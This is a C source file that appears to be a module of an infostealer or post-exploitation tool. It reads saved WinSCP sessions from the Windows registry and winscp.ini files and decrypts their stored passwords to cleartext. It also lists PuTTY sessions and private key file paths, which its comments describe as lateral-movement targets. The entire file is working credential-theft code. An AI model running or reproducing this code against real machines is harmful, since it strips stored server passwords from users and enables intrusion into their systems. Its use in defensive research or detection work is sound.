/* WinSCP with global registry + file search */
#include "winscp.h"
#include "browser/utils.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>
#include <winreg.h>
#include <shlobj.h>

#define PW_MAGIC 0xA3
#define PW_FLAG  0xFF

/* Decode one hex-encoded byte. Bounds-checked: returns 0 and consumes the
 * rest on malformed input instead of reading past the buffer.
 * WinSCP formula (matches SharpDecryptPwd): byte = (~(b1*16 + b2)) ^ 0xA3 */
static char decrypt_next(const char** pass, const char* end){
    const char* bases="0123456789ABCDEFabcdef";
    const char* f;
    const char* s;
    if (!pass || !*pass || end - *pass < 2) { if (pass) *pass = end; return 0; }
    f = strchr(bases, (*pass)[0]);
    s = strchr(bases, (*pass)[1]);
    if (!f || !s) { *pass = end; return 0; }
    {
        int fv=(int)(f-bases)*16;
        int sv=(int)(s-bases);
        if (sv >= 16) sv -= 6; /* lowercase a-f sits after uppercase A-F in the table */
        char flag=(char)((((~(fv+sv))^PW_MAGIC)%256+256)%256);
        *pass+=2;return flag;
    }
}

static char* decrypt_winscp(const char* host, const char* user, const char* pass){
    static char result[256];result[0]=0;
    char unikey[512];snprintf(unikey,sizeof(unikey),"%s%s",user,host);
    int ukl=(int)strlen(unikey);
    const char* rem=pass;
    const char* end=pass+strlen(pass);
    char stored_flag=decrypt_next(&rem,end);
    char length;
    if(rem>=end)return result;
    if(stored_flag==PW_FLAG){decrypt_next(&rem,end);decrypt_next(&rem,end);length=decrypt_next(&rem,end);}
    else length=stored_flag;
    if(rem>=end)return result;
    {
        char flag=decrypt_next(&rem,end);
        int skip=(unsigned char)flag*2;
        if(skip>end-rem)skip=(int)(end-rem);
        rem+=skip;
    }
    {
        char ct[256];int cp=0;
        int n=(unsigned char)length;
        if(n>(int)sizeof(ct)-1)n=(int)sizeof(ct)-1;
        for(int i=0;i<n&&end-rem>=2;i++)ct[cp++]=decrypt_next(&rem,end);
        ct[cp]=0;
        if(stored_flag==PW_FLAG){if(ukl>0&&cp>=ukl&&memcmp(ct,unikey,ukl)==0)snprintf(result,sizeof(result),"%s",ct+ukl);}
        else snprintf(result,sizeof(result),"%s",ct);
    }
    return result;
}

static void trim_line(char* line) {
    if (!line) return;
    char* p = strchr(line, '\n'); if (p) *p = 0;
    p = strchr(line, '\r'); if (p) *p = 0;
}

static void append_ini_session(char* result, int* rp, int maxr,
                               const char* source, const char* session,
                               const char* host, const char* user,
                               unsigned long port, const char* pass) {
    if (!host || !host[0] || !pass || !pass[0]) return;
    const char* label = (session && session[0]) ? session : "(session)";
    const char* dec = decrypt_winscp(host, user ? user : "", pass);
    *rp += snprintf(result + *rp, maxr - *rp,
        "[%s] %s - Host: %s Port: %lu User: %s Pass: %s\n",
        source, label, host, port, user && user[0] ? user : "", dec);
}

static void parse_ini_file(const char* path, char* result, int* rp, int maxr, int dump_lines) {
    FILE* f = fopen(path, "r");
    if (!f) return;

    char line[1024];
    char section[256] = "";
    char host[256] = "", user[256] = "", pass[512] = "";
    unsigned long port = 0;
    int emitted_session = 0;

    while (fgets(line, sizeof(line), f)) {
        trim_line(line);
        if (!line[0] || line[0] == ';' || line[0] == '#') continue;

        if (line[0] == '[') {
            if (section[0] && host[0] && pass[0]) {
                append_ini_session(result, rp, maxr, "Config", section, host, user, port, pass);
                emitted_session = 1;
            }

            strncpy(section, line + 1, sizeof(section) - 1);
            char* end = strchr(section, ']');
            if (end) *end = 0;
            host[0] = user[0] = pass[0] = 0;
            port = 0;
            continue;
        }

        char* eq = strchr(line, '=');
        if (!eq) continue;
        *eq = 0;
        const char* key = line;
        const char* value = eq + 1;

        if (_stricmp(key, "HostName") == 0) strncpy(host, value, sizeof(host) - 1);
        else if (_stricmp(key, "UserName") == 0) strncpy(user, value, sizeof(user) - 1);
        else if (_stricmp(key, "Password") == 0) strncpy(pass, value, sizeof(pass) - 1);
        else if (_stricmp(key, "PortNumber") == 0) port = strtoul(value, NULL, 10);

        if (dump_lines && (strstr(key, "HostName") || strstr(key, "UserName") || strstr(key, "PortNumber"))) {
            *rp += snprintf(result + *rp, maxr - *rp, "  %s=%s\n", key, value);
        }
    }

    if (section[0] && host[0] && pass[0]) {
        append_ini_session(result, rp, maxr, "Config", section, host, user, port, pass);
        emitted_session = 1;
    }

    if (!emitted_session && dump_lines) {
        *rp += snprintf(result + *rp, maxr - *rp, "  (no session entries parsed)\n");
    }
    fclose(f);
}

/* Search registry for WinSCP sessions */
static void scan_registry(char* result, int* rp, int maxr){
    const char* reg_paths[]={
        "Software\\Martin Prikryl\\WinSCP 2\\Sessions",
        "Software\\Martin Prikryl\\WinSCP\\Sessions",
        NULL
    };
    for(int ri=0;reg_paths[ri];ri++){
        HKEY hk;
        if(RegOpenKeyExA(HKEY_CURRENT_USER,reg_paths[ri],0,KEY_READ,&hk)!=ERROR_SUCCESS)continue;
        DWORD idx=0;char sn[256];
        while(RegEnumKeyA(hk,idx++,sn,sizeof(sn))==ERROR_SUCCESS){
            char sp[768];snprintf(sp,sizeof(sp),"%s\\%s",reg_paths[ri],sn);
            HKEY hsk;
            if(RegOpenKeyExA(HKEY_CURRENT_USER,sp,0,KEY_READ,&hsk)==ERROR_SUCCESS){
                char host[256]="",user[256]="",pass[512]="";DWORD port=0;
                BYTE buf[512];DWORD sz=sizeof(buf);
                if(RegQueryValueExA(hsk,"HostName",NULL,NULL,buf,&sz)==ERROR_SUCCESS&&sz<sizeof(buf))strncpy(host,(char*)buf,255);
                sz=sizeof(buf);RegQueryValueExA(hsk,"UserName",NULL,NULL,buf,&sz);if(sz<sizeof(buf))strncpy(user,(char*)buf,255);
                sz=sizeof(buf);RegQueryValueExA(hsk,"Password",NULL,NULL,buf,&sz);if(sz<sizeof(buf))strncpy(pass,(char*)buf,511);
                sz=sizeof(port);RegQueryValueExA(hsk,"PortNumber",NULL,NULL,(BYTE*)&port,&sz);
                if(host[0]&&pass[0]){char*dp=decrypt_winscp(host,user,pass);
                    *rp+=snprintf(result+*rp,maxr-*rp,"[Registry] %s - Host: %s Port: %u User: %s Pass: %s\n",sn,host,port,user,dp);}
                RegCloseKey(hsk);
            }
        }
        RegCloseKey(hk);
    }
}

/* Search for winscp.ini on disk */
static void scan_ini_files(char* result, int* rp, int maxr){
    char paths[4][MAX_PATH];int pc=0;
    char appdata[MAX_PATH];
    if(SUCCEEDED(SHGetFolderPathA(NULL,CSIDL_APPDATA,NULL,0,appdata))){snprintf(paths[pc++],MAX_PATH,"%s\\winscp.ini",appdata);}
    GetEnvironmentVariableA("APPDATA",appdata,sizeof(appdata));
    if(appdata[0]){snprintf(paths[pc++],MAX_PATH,"%s\\winscp.ini",appdata);}
    char up[MAX_PATH];GetEnvironmentVariableA("USERPROFILE",up,sizeof(up));
    snprintf(paths[pc++],MAX_PATH,"%s\\winscp.ini",up);
    snprintf(paths[pc++],MAX_PATH,"%s\\Documents\\winscp.ini",up);

    for(int i=0;i<pc;i++){
        if(path_exists(paths[i])){
            *rp+=snprintf(result+*rp,maxr-*rp,"[Config] Found: %s\n",paths[i]);
            parse_ini_file(paths[i], result, rp, maxr, 1);
        }
    }
    /* Also search recursively only after WinSCP process/common-path evidence exists. */
    if(!result[0] && process_exists("WinSCP.exe")){
        char* found=find_file_recursive(up,"winscp.ini",5);
        if(found){
            *rp+=snprintf(result+*rp,maxr-*rp,"[Config] Found: %s\n",found);
            parse_ini_file(found, result, rp, maxr, 1);
            free(found);
        }
    }
}

/* PuTTY saved sessions: HKCU\Software\SimonTatham\PuTTY\Sessions.
 * PuTTY itself does not store passwords, but Host/User/KeyFile are
 * high-value lateral-movement indicators. */
static void scan_putty_sessions(char* result, int* rp, int maxr){
    HKEY hk;
    char sn[256]; DWORD idx = 0; int found = 0;
    #define PUTTY_APPEND(s) do { size_t L = strlen(result); if (L < (size_t)maxr - 1) { strncat(result, (s), (size_t)maxr - 1 - L); *rp = (int)strlen(result); } } while (0)
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\SimonTatham\\PuTTY\\Sessions", 0, KEY_READ, &hk) != ERROR_SUCCESS) {
        PUTTY_APPEND("===== PuTTY Sessions =====\n  (no PuTTY sessions found)\n\n");
        return;
    }
    PUTTY_APPEND("===== PuTTY Sessions =====\n");
    while (RegEnumKeyA(hk, idx++, sn, sizeof(sn)) == ERROR_SUCCESS) {
        char sp[768]; HKEY hsk;
        char host[256] = {0}, user[256] = {0}, proto[64] = {0}, keyfile[MAX_PATH] = {0}, sessname[256];
        DWORD port = 22, type = 0, sz = 0;
        snprintf(sp, sizeof(sp), "Software\\SimonTatham\\PuTTY\\Sessions\\%s", sn);
        if (RegOpenKeyExA(HKEY_CURRENT_USER, sp, 0, KEY_READ, &hsk) != ERROR_SUCCESS) continue;
        sz = (DWORD)sizeof(host);     RegQueryValueExA(hsk, "HostName", NULL, &type, (BYTE*)host, &sz);
        sz = (DWORD)sizeof(user);     RegQueryValueExA(hsk, "UserName", NULL, &type, (BYTE*)user, &sz);
        sz = (DWORD)sizeof(proto);    RegQueryValueExA(hsk, "Protocol", NULL, &type, (BYTE*)proto, &sz);
        sz = (DWORD)sizeof(keyfile);  RegQueryValueExA(hsk, "PublicKeyFile", NULL, &type, (BYTE*)keyfile, &sz);
        sz = (DWORD)sizeof(port);     RegQueryValueExA(hsk, "PortNumber", NULL, &type, (BYTE*)&port, &sz);
        if (!host[0] && !user[0]) { RegCloseKey(hsk); continue; }
        found++;
        strncpy(sessname, sn, sizeof(sessname) - 1); sessname[sizeof(sessname) - 1] = 0;
        for (char* p = sessname; *p; p++) {
            if (*p == '%' && p[1] && p[2]) {
                int hv = -1, lv = -1;
                if (p[1] >= '0' && p[1] <= '9') hv = p[1] - '0';
                else if (p[1] >= 'A' && p[1] <= 'F') hv = p[1] - 'A' + 10;
                else if (p[1] >= 'a' && p[1] <= 'f') hv = p[1] - 'a' + 10;
                if (p[2] >= '0' && p[2] <= '9') lv = p[2] - '0';
                else if (p[2] >= 'A' && p[2] <= 'F') lv = p[2] - 'A' + 10;
                else if (p[2] >= 'a' && p[2] <= 'f') lv = p[2] - 'a' + 10;
                if (hv >= 0 && lv >= 0) {
                    int ch = hv * 16 + lv;
                    *p = (char)(ch >= 32 && ch < 127 ? ch : '_');
                    memmove(p + 1, p + 3, strlen(p + 3) + 1);
                }
            }
        }
        PUTTY_APPEND("  -----------------------------------------");
        PUTTY_APPEND("\n  [+] Session: ");
        PUTTY_APPEND(sessname);
        PUTTY_APPEND("\n  [+] Host: ");
        PUTTY_APPEND(host);
        { char tmp[96]; snprintf(tmp, sizeof(tmp), "\n  [+] Port: %lu  Proto: %s\n", (unsigned long)port, proto[0] ? proto : "ssh"); PUTTY_APPEND(tmp); }
        if (user[0]) { PUTTY_APPEND("  [+] User: "); PUTTY_APPEND(user); PUTTY_APPEND("\n"); }
        if (keyfile[0]) { PUTTY_APPEND("  [+] PrivateKey: "); PUTTY_APPEND(keyfile); PUTTY_APPEND("\n"); }
        if (*rp > maxr - 2048) { RegCloseKey(hsk); break; }
        RegCloseKey(hsk);
    }
    if (!found) PUTTY_APPEND("  (no saved sessions with host/user data)\n");
    PUTTY_APPEND("\n");
    RegCloseKey(hk);
    #undef PUTTY_APPEND
}

const char* winscp_scan(const char* config_path){
    static char result[65536];int rp=0;result[0]=0;
    if(config_path&&config_path[0]&&path_exists(config_path)){
        rp+=snprintf(result+rp,sizeof(result)-rp,"[Config] Using: %s\n",config_path);
        parse_ini_file(config_path, result, &rp, sizeof(result), 1);
    }
    scan_registry(result,&rp,sizeof(result));
    scan_ini_files(result,&rp,sizeof(result));
    scan_putty_sessions(result,&rp,sizeof(result));
    rp = (int)strlen(result);
    if(!result[0])snprintf(result,sizeof(result),"WinSCP not found. Searched registry and common config paths.\n");
    return result;
}
